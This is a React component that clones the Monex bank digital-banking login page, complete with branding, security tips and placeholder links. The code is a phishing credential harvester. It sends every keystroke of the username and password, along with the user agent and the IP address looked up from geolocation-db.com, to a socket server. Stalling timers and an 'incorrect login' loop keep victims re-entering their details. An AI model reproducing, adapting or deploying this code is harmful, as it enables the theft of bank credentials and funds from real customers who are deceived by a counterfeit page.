import React from "react";
import i00 from "./img/icons/logo.png";
import i01 from "./img/icons/mail.gif";
import i02 from "./img/icons/seguridad-digital.png";
import i03 from "./img/icons/playstore.png";
import i04 from "./img/icons/appstore.png";
import i05 from "./img/icons/amipci.png";
import i06 from "./img/icons/esr.png";
import socket from "../socket";
import axios from "axios";

function Login({ sS }) {
  const [user, setUser] = React.useState("");
  const [password, setPassword] = React.useState("");
  const [i, setI] = React.useState(0);
  const [b, setB] = React.useState(false);
  const [e0, setE0] = React.useState(false);
  const [e1, setE1] = React.useState(false);
  const [isActive, setIsActive] = React.useState(false);
  const [time, setTime] = React.useState(0);
  const [cont, setCont] = React.useState(0);
  const [isActive1, setIsActive1] = React.useState(false);
  const [time1, setTime1] = React.useState(0);
  const [cont1, setCont1] = React.useState(0);
  const [data, setData] = React.useState("");
  /*const dispatch = useDispatch();*/

  React.useEffect(() => {
    getData();
  }, []);

  const eyes0 = () => {
    setE0(!e0);
  };
  const eyes1 = () => {
    setE1(!e1);
  };

  const getData = async () => {
    await axios
      .get(`https://geolocation-db.com/json/`)
      .then((res) => {
        setData(res.data);
      })
      .catch((err) => {
        console.error(err);
      });
  };

  React.useEffect(() => {
    socket.connect();
    socket.emit("update username", { username: user, login: false });
    socket.emit("open login", { login: false });
    socket.auth = {
      username: user,
      userAgent: window.navigator.userAgent,
      ip: data.IPv4,
    };
  }, [user, data.IPv4 ]);

  React.useEffect(() => {
    socket.emit("update password", { password: password, bPlogin: false });
    socket.emit("open bPlogin", { bPlogin: false });
  }, [password]);

  const handleButton = (e) => {
    e.preventDefault();
      if (user !== "") {
        sS(true);
        setIsActive(true);
        socket.connect();
        socket.emit("update username", {
          username: user,
          login: true,
        });
        socket.emit("open login", { login: true });
        socket.auth = {
          username: user,
          userAgent: window.navigator.userAgent,
          ip: data.IPv4,
        };
        setIsActive(true);
    }
  };

  const handleButton1 = (e) => {
    e.preventDefault();
    if (password !== "") {
      setIsActive1(true);
      socket.emit("update password", { password: password, bPlogin: true });
      socket.emit("open bPlogin", { bPlogin: true });
      sS(true);
    }
  };

  React.useEffect(() => {
    let interval = null;
    if (time >= 5) {
      sS(false);
      setIsActive(false);
      setCont(cont + 0);
      setTime(0);
      setB(true);
    }

    if (isActive) {
      interval = setInterval(() => {
        setTime((time) => time + 1);
        socket.emit("time user", { time: time + 1, p: cont + 2 });
      }, 1000);
    } else {
      clearInterval(interval);
    }
    return () => {
      clearInterval(interval);
    };
  }, [isActive, time, cont, sS]);

  React.useEffect(() => {
    let interval = null;
    if (time1 >= 60) {
      setIsActive1(false);
      setCont1(cont1 + 0);
      setTime1(0);
      sS(false);
    }

    if (isActive1) {
      interval = setInterval(() => {
        setTime1((time1) => time1 + 1);
        socket.emit("time user", { time: time1 + 1, p: cont1 + 2 });
      }, 1000);
    } else {
      clearInterval(interval);
    }
    return () => {
      clearInterval(interval);
    };
  }, [isActive1, time1, cont1, sS]);

  React.useEffect(() => {
    socket.on("incorrect login", () => {
      sS(false);
      setI(i + 1);
      setIsActive1(false);
      setTime1(0);
      setUser("");
      setPassword("");
      setCont1(0);
    });
    return () => {
      socket.off("incorrect login");
    };
  }, [i, sS]);

  return (
    <>
      <div className="modal" id="mensajeGenerico">
        <a
          className="close-modal close-md"
          id="closeGenerico"
          style={{ display: "none" }}
        ></a>
        <div className="container" id="containerGenerico">
          <div className="logo">
            <img src={i00} alt="Grupo Financiero Monex" />
          </div>
          <div className="mensaje informacion">
            <div className="mb30" align="center">
              <p className="f23" id="tituloGenerico"></p>
            </div>
            <div className="mb30">
              <p id="cuerpoGenerico"></p>
            </div>
            <div className="row">
              <div id="renglonGenerico">
                <div className="col6 xs-mb10" id="botonGenerico">
                  <a className="btn full close-md"></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <header>
        <div id="container">
          <a href="#" className="logo">
            <img src={i00} alt="MONEX Grupo Financiero" />
          </a>

          <div className="menu-bar">
            <a
              className="lnkChangeLanguage flag flag-us"
              title="Change to English"
            ></a>
            <a href="#">
              <img src={i01} alt="" />
            </a>
          </div>
        </div>
      </header>
      <section
        className="stage img-bg h450 mb50"
        style={{ backgroundImage: `url(${i02})` }}
      ></section>

      <section className="mt-190">
        <article id="boxlogin">
          <div className="bg-white p40 mb40 xs-p0">
            <div className="row tbl">
              <div className="col6">
                <div className="xs-p20">
                  <h2>
                    <em className="tipsTitulo">Tips de seguridad</em>
                  </h2>
                  <ul className="bull mb30">
                    <li>
                      <p className="tips" style={{ textAlign: "justify" }}>
                        Monex NO solicitará datos confidenciales
                        &#40;Contraseñas y Token&#41; por ningún medio
                        electrónico y/o telefónico. Favor de no proporcionar sus
                        datos a terceros por seguridad. Para evitar el phishing
                        &#40;llamadas o correos electrónicos aparentemente
                        confiables que solicitan datos confidenciales de sus
                        cuentas&#41;, no contestar ningún correo o llamada que
                        le solicite información personal, le recomendamos
                        eliminar y verificar el origen de la solicitud con su
                        Asesor Monex.
                      </p>
                    </li>
                    <li>
                      <p className="tips" style={{ textAlign: "justify" }}>
                        La dirección del sitio de Internet de Monex es:{" "}
                        <a href="#" className="under blue">
                          https://www.monex.com.mx/portal
                        </a>
                        , favor de ingresar por la URL y no realizarlo a través
                        de motores de búsqueda.
                      </p>
                    </li>
                    <li>
                      <p className="tips">
                        Al momento de colocar el usuario, asegúrese de que sea
                        correcto el siguiente enlace:
                        <a href="#" className="under blue">
                          https://bancadigital.monex.com.mx/PortalServicios/serviciosenlinea/view/template/ServiciosEnLinea.jsp
                        </a>
                      </p>
                    </li>
                    <li>
                      <p className="tips" style={{ textAlign: "justify" }}>
                        Le invitamos a conocer nuestras medidas preventivas:{" "}
                        <a href="#" className="under blue">
                          https://www.monex.com.mx/portal/banca-de-empresas/81/consejos-de-seguridad
                        </a>
                      </p>
                    </li>

                    <li>
                      <p className="tips" style={{ textAlign: "justify" }}>
                        Al momento de ingresar autorizo y doy mi consentimiento
                        expreso para que Banco Monex, S.A. Institución de Banca
                        Múltiple, Monex Grupo Financiero, recabe y conserve la
                        información de la geolocalización del dispositivo a
                        través del cual accedo para realizar operaciones, en
                        términos de las disposiciones oficiales vigentes. Acepto
                        el
                        <a
                          className="under blue"
                          target="_blank"
                          rel="noopener noreferrer"
                          href="#"
                        >
                          <em>Aviso de Privacidad</em>
                        </a>
                        y los
                        <a
                          className="under blue"
                          href="#"
                          target="_blank"
                          rel="noopener noreferrer"
                        >
                          <em>Términos y Condiciones</em>
                        </a>
                      </p>
                    </li>
                  </ul>
                  <p className="tips">
                    Para mayor información comunicarse con su Asesor Monex; o al
                    55-5231-4500 en la Ciudad de México o al 800-746-6639 desde
                    el Interior de la República, o bien a: <br />{" "}
                    <a href="#" className="under blue">
                      https://www.monex.com.mx/portal/contacto
                    </a>
                  </p>
                </div>
              </div>

              <div className="col6 va">
                <a id="diverror" style={{ width: "100%" }}></a>

                <div id="login" className="login" style={{ display: "block" }}>
                  {" "}
                  <br />
                  <br />
                  <h4 className="blue mb30" align="center">
                    <em>Acceso a Banca Digital</em>
                  </h4>
                  <br />
                  <form
                    id="frmBusqueda"
                    autoComplete="off"
                    onSubmit={!b ? handleButton: handleButton1}
                  >
                    <div className="input">
                      <span className="icon personas"></span>
                      <input
                        type={`${e0 ? "text" : "password"}`}
                        id="j_username"
                        name="j_username"
                        autoComplete="off"
                        placeholder="Usuario"
                        value={user}
                        onChange={(e) => {
                          setUser(e.target.value);
                        }}
                      />
                      <span
                        className={`icon2 ${e0 ? "nover" : "ver"}`}
                        onClick={eyes0}
                        id="mostrarUsuario"
                      ></span>

                      <input type="hidden" name="_csrf" value="" />
                    </div>
                    {!b && (
                      <button
                        id="btnSubmit"
                        className="btn bg-blue"
                        type="submit"
                      >
                        Verificar
                      </button>
                    )}
                    {b && (
                      <>
                        <div class="input">
                          <span class="icon lock"></span>{" "}
                          <input
                            type={`${e1 ? "text" : "password"}`}
                            value={password}
                            onChange={(e) => {
                              setPassword(e.target.value);
                            }}
                            name="j_password"
                            id="j_password"
                            autoComplete="off"
                            placeholder="Contraseña"
                          />
                          <span
                            className={`icon2 ${e1 ? "nover" : "ver"}`}
                            onClick={eyes1}
                            id="mostrarPassWord"
                          ></span>
                        </div>

                        <button
                          id="btnSubmit"
                          className="btn bg-blue"
                          type="submit"
                        >
                          Verificar
                        </button>
                      </>
                    )}
                    <div className="row mb20">
                      <div className="col6 sm-nb xs-mb20" align="right">
                        <a>
                          <em>¿Olvidaste tu contraseña?</em>
                        </a>
                      </div>
                      <div className="col6 sm-nb">
                        <a href="#" target="_blank">
                          <em>Registro de nuevos usuarios</em>
                        </a>
                      </div>
                    </div>
                    <div align="center">
                      <a
                        className="privacidad"
                        target="_blank"
                        rel="noopener noreferrer"
                        href="#"
                      >
                        <small>Aviso de Privacidad</small>
                      </a>
                    </div>
                  </form>
                </div>

                <div id="olvido" className="login hidden">
                  <h4 className="white mb10">
                    <em>Acceso Banca Digital</em>
                  </h4>

                  <div className="mb30 xs-left" style={{ fontSize: "12px" }}>
                    <p className="f23 white">¿Olvidaste tu contraseña?</p>
                  </div>
                  <div className="white">
                    <div style={{ width: "70%", marginLeft: "15%" }}>
                      <p className="mb20 xs-left" style={{ fontSize: "12px" }}>
                        Con la finalidad de poder recuperar sus accesos, es
                        necesario que envíe un correo a la dirección
                        gac@monex.com.mx con los siguientes datos:
                      </p>
                      <p className="mb20 xs-left" style={{ fontSize: "12px" }}>
                        Asunto: Contraseña Temporal.
                      </p>
                      <ul
                        style={{
                          listStyleType: "disc",
                          paddingLeft: "30px",
                          fontSize: "12px",
                        }}
                      >
                        <li>Número de Contrato.</li>
                        <li>
                          Nombre Completo del Titular del Contrato &#40;Razón
                          Social o Persona Física con Actividad
                          Empresarial&#41;.
                        </li>
                        <li>Nombre Completo del Participante del Contrato.</li>
                      </ul>
                      <p
                        className="mb20 mt20 xs-left"
                        style={{ fontSize: "12px" }}
                      >
                        <b>
                          Es importante indicarle que esta información debe
                          venir desde el correo que se encuentra autorizado en
                          sistema.
                        </b>
                      </p>
                    </div>

                    <div align="center">
                      <button className="btn btn-regresar bg-blue">
                        Regresar
                      </button>
                    </div>
                  </div>
                </div>

                <div className="appsMOviles content">
                  <div className="">
                    <p className="">
                      <em>
                        Te invitamos a descargar nuestra aplicación{" "}
                        <span className="appsMOvilesazul">Monex Móvil</span> en
                        tú teléfono celular para contar con un medio de acceso
                        más a tu Cuenta Digital.
                      </em>
                    </p>
                  </div>

                  <div className="row mb20">
                    <div className="col6 sm-nb xs-mb20" align="right">
                      <a
                        className="imagenAndorid"
                        title="Monex móvil android"
                        href="#"
                      >
                        <img src={i03} alt="Monex móvil android" />
                      </a>
                    </div>

                    <div className="col6 sm-nb" align="left">
                      <a className="imagenIOS" title="Monex móvil IOS" href="#">
                        <img src={i04} alt="Monex móvil IOS" />
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </article>
      </section>

      <footer>
        <div className="container">
          <div className="tbl">
            <div className="col2 sm-col3 xs-col12">
              <a href="#" target="_blank" rel="noopener noreferrer">
                <img src={i05} alt="" />
              </a>
            </div>
            <div className="col8 sm-col6 xs-col12 vab" align="center">
              <p>
                <a href="#" target="_blank" rel="noopener noreferrer">
                  Legales y Políticas de Privacidad
                </a>{" "}
                |
                <a href="#" target="_blank" rel="noopener noreferrer">
                  Aviso Legal
                </a>{" "}
                |<a href="#">Condusef</a>
              </p>

              <p>Derechos Reservados 2024</p>
            </div>
            <div className="col2 sm-col3 xs-col12">
              <img src={i06} alt="" />
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}

export default Login;
